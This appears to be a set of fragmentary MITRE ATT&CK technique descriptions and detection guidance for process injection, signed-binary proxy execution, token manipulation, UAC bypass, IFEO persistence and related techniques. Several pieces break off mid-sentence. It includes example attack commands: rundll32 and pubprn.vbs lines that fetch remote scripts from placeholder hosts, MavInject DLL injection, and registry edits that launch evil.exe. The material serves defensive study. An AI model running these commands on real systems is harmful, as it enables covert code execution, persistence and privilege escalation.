        Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

        Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [PowerShell](https://attack.mitre.org/techniques/T1086) with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

        Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

        ### Windows

        There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)

        * **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
        * **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
        * **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.
        * **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
        * **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

        ### Mac and Linux

        Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)

        * **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
        * **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
        * **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
        * **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

        Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.

        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)

        The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

        Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks.

        Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity.

        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

        Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

        ### Msiexec.exe
        Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)

        * <code>msiexec.exe /y "C:\path\to\file.dll"</code>

        ### Mavinject.exe
        Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

        * <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
        * <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>

        ### SyncAppvPublishingServer.exe
        SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

        ### Odbcconf.exe
        Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)

        PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>

        how the file is processed by the operating system. For example, if there is
        a Mach-O executable file called evil.bin, when it is double clicked by a user,
        it will launch Terminal.app and execute. If this file is renamed to evil.txt,

        \"evil.txt \" (note the space at the end), then when double clicked by a user,

        (DNX), dnx.exe, is a software development kit packaged with Visual Studio
        Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft
        Migrating from DNX) DNX is not present on standard builds of Windows and may
        only be present on developer workstations using older versions of .NET Core
        and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. \n\nAn
        adversary can use dnx.exe to proxy execution of arbitrary code to bypass application
        whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)\n\n###
        RCSI\n\nThe rcsi.exe utility is a non-interactive command-line interface for
        C# that is similar to csi.exe. It was provided within an early version of
        the Roslyn .NET Compiler Platform but has since been deprecated for an integrated
        solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed
        by Microsoft. (Citation: engima0x3 RCSI Bypass)\n\nC# .csx script files can
        be written and executed with rcsi.exe at the command-line. An adversary can
        use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting
        policies that do not account for execution of rcsi.exe. (Citation: engima0x3
        RCSI Bypass)\n\n### WinDbg/CDB\n\nWinDbg is a Microsoft Windows kernel and
        user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe
        is also user-mode debugger. Both utilities are included in Windows software
        development kits and can be used as standalone tools. (Citation: Microsoft
        Debugging Tools for Windows) They are commonly used in software development
        and reverse engineering and may not be found on typical Windows systems. Both
        WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn adversary can
        use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass
        application whitelist policies that do not account for execution of those
        utilities. (Citation: Exploit Monday WinDbg)\n\nIt is likely possible to use
        other debuggers for similar purposes, such as the kernel-mode debugger kd.exe,
        which is also signed by Microsoft.\n\n### Tracker\n\nThe file tracker utility,
        tracker.exe, is included with the .NET framework as part of MSBuild. It is
        used for logging calls to the Windows file system. (Citation: Microsoft Docs
        File Tracking)\n\nAn adversary can use tracker.exe to proxy execution of an
        arbitrary DLL into another process. Since tracker.exe is also signed it can
        be used to bypass application whitelisting solutions. (Citation: Twitter SubTee
        Tracker.exe)"

        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)

        Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)

        * <code>msxsl.exe customers[.]xml script[.]xsl</code>

        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.

        Command-line examples: (Citation: subTee WMIC XSL APR 2018)

      description: "Windows uses access tokens to determine the ownership of a running
        process. A user can manipulate access tokens to make a running process appear
        as though it belongs to someone other than the user that started the process.
        When this occurs, the process also takes on the security context associated
        with the new token. For example, Microsoft promotes the use of access tokens
        as a security best practice. Administrators should log in as a standard user
        but run their tools with administrator privileges using the built-in access
        token manipulation command <code>runas</code>. (Citation: Microsoft runas)\n
        \ \nAdversaries may use access tokens to operate under a different user or
        system security context to perform actions and evade detection. An adversary
        can use built-in Windows API functions to copy access tokens from existing
        processes; this is known as token stealing. An adversary must already be in
        a privileged user context (i.e. administrator) to steal a token. However,
        adversaries commonly use token stealing to elevate their security context
        from the administrator level to the SYSTEM level. An adversary can use a token
        to authenticate to a remote system as the account for that token if the account
        has appropriate permissions on the remote system. (Citation: Pentestlab Token
        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
        methods: (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token
        Impersonation/Theft** - An adversary creates a new access token that duplicates
        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
        to assign the impersonated token to a thread. This is useful for when the
        target user has a non-network logon session on the system.\n\n**Create Process
        with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
        running under the security context of the impersonated user. This is useful
        for creating a new process under the security context of a different user.\n\n**Make
        and Impersonate Token** - An adversary has a username and password but the
        user is not logged onto the system. The adversary can then create a logon
        session for the user using the <code>LogonUser</code> function. The function
        will return a copy of the new session's access token and the adversary can
        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
        user can use the <code>runas</code> command, and the Windows API functions,
        to create impersonation tokens; it does not require access to an administrator
        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
        and uses token impersonation to escalate privileges. (Citation: Metasploit
        access token)  The Cobalt Strike beacon payload allows arbitrary token impersonation
        and can also create tokens. (Citation: Cobalt Strike Access Token)"

        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

        * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
        * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
        * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>

        TechNet Audit Policy) Look for suspicious account behavior across systems
        that share accounts, either user, admin, or service accounts. Examples: one
        account logged into multiple systems simultaneously; multiple accounts logged
        into the same machine simultaneously; accounts logged in at odd times or outside
        of business hours. Activity may be from interactive login sessions or process
        ownership from accounts being used to execute binaries on a remote system
        as a particular account. Correlate other security systems with login information
        (e.g., a user has an active login session but has not entered the building
        or does not have VPN access).\n\nPerform regular audits of domain and local
        system accounts to detect accounts that may have been created by an adversary
        for persistence. Checks on these accounts could also include whether default
        accounts such as Guest have been activated. These audits should also include
        checks on any appliances and applications for default credentials or SSH keys,
        and if any are discovered, they should be updated immediately. "

      description: "Adversaries may steal the credentials of a specific user or service
        account using Credential Access techniques or capture credentials earlier
        in their reconnaissance process through social engineering for means of gaining
        Initial Access. \n\nAccounts that an adversary may use can fall into three
        categories: default, local, and domain accounts. Default accounts are those
        that are built-into an OS such as Guest or Administrator account on Windows
        systems or default factory/provider set accounts on other types of systems,
        software, or devices. Local accounts are those configured by an organization
        for use by users, remote support, services, or for administration on a single
        system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts
        are those managed by Active Directory Domain Services where access and permissions
        are configured across systems and services that are part of that domain. Domain
        accounts can cover users, administrators, and services.\n\nCompromised credentials
        may be used to bypass access controls placed on various resources on systems
        within the network and may even be used for persistent access to remote systems
        and externally available services, such as VPNs, Outlook Web Access and remote
        desktop. Compromised credentials may also grant an adversary increased privilege
        to specific systems or access to restricted areas of the network. Adversaries
        may choose not to use malware or tools in conjunction with the legitimate
        access those credentials provide to make it harder to detect their presence.\n\nDefault
        accounts are also not limited to Guest and Administrator on client machines,
        they also include accounts that are preset for equipment such as network devices
        and computer applications whether they are internal, open source, or COTS.
        Appliances that come preset with a username and password combination pose
        a serious threat to organizations that do not change it post installation,
        as they are easy targets for an adversary. Similarly, adversaries may also
        utilize publicly disclosed private keys, or stolen private keys, to legitimately
        connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021)
        (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials,
        and permissions across a network of systems is of concern because the adversary
        may be able to pivot across accounts and systems to reach a high level of
        access (i.e., domain or enterprise administrator) to bypass access controls
        set within the enterprise. (Citation: TechNet Credential Theft)"

        There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):

        * Shim-Process-Scanner - checks memory of every running process for any Shim flags
        * Shim-Detector-Lite - detects installation of custom shim databases
        * Shim-Guard - monitors registry for any shim installations
        * ShimScanner - forensic tool to find active shims in memory
        * ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)

        Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.

      description: "The Microsoft Windows Application Compatibility Infrastructure/Framework
        (Application Shim) was created to allow for backward compatibility of software
        as the operating system codebase changes over time. For example, the application
        shimming feature allows developers to apply fixes to applications (without
        rewriting code) that were created for Windows XP so that it will work with
        Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework,
        shims are created to act as a buffer between the program (or more specifically,
        the Import Address Table) and the Windows OS. When a program is executed,
        the shim cache is referenced to determine if the program requires the use
        of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179)
        to redirect the code as necessary in order to communicate with the OS. \n\nA
        list of all shims currently installed by the default Windows installer (sdbinst.exe)
        is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows
        nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases
        are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n*
        <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo
        keep shims secure, Windows designed them to run in user mode so they cannot
        modify the kernel and you must have administrator privileges to install a
        shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)
        (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data
        Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),
        and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179),
        utilizing these shims may allow an adversary to perform several malicious
        acts such as elevate privileges, install backdoors, disable defenses like
        Windows Defender, etc."

        There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038), which indicate attempts to gain access to higher privileged processes.

        Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

        * The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
        * The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

        Analysts should monitor these Registry settings for unauthorized changes.

        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

        Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

        Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity.

        functions. \n\nHooking involves redirecting calls to these functions and can
        be implemented via:\n\n* **Hooks procedures**, which intercept and execute
        designated code in response to events such as messages, keystrokes, and mouse
        inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection
        July 2017)\n* **Import address table (IAT) hooking**, which use modifications
        to a process’s IAT, where pointers to imported API functions are stored. (Citation:
        Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks
        Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,
        which overwrites the first bytes in an API function to redirect code flow.
        (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge
        Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar
        to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries
        may use hooking to load and execute malicious code within the context of another
        process, masking the execution while also allowing access to the process's
        memory and possibly elevated privileges. Installing hooking mechanisms may
        also provide Persistence via continuous invocation when the functions are
        called through normal use.\n\nMalicious hooking mechanisms may also capture
        API calls that include parameters that reveal user authentication credentials
        for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept
        2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s
        to conceal files, processes, Registry keys, and other objects in order to
        hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)"

        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

        list (plist) files found in <code>/System/Library/LaunchDaemons</code> and
        <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons).
        These LaunchDaemons have property list files which point to the executables
        that will be launched (Citation: Methods of Mac Malware Persistence).\n \nAdversaries
        may install a new launch daemon that can be configured to execute at startup
        by using launchd or launchctl to load a plist into the appropriate directories
        (Citation: OSX Malware Detection). The daemon name may be disguised by using
        a name from a related operating system or benign software  (Citation: WireLurker).
        Launch Daemons may be created with administrator privileges, but are executed
        under root privileges, so an adversary may also use a service to escalate
        privileges from administrator to root.\n \nThe plist file permissions must
        be root:wheel, but the script or program that it points to has no such requirement.
        So, it is possible for poor configurations to allow an adversary to modify
        a current Launch Daemon’s executable and gain persistence or Privilege Escalation."

        Monitor service creation through changes in the Registry and common utilities using command-line invocation. Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017) (Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could create services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like "Knock Knock" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

        Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

        Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)

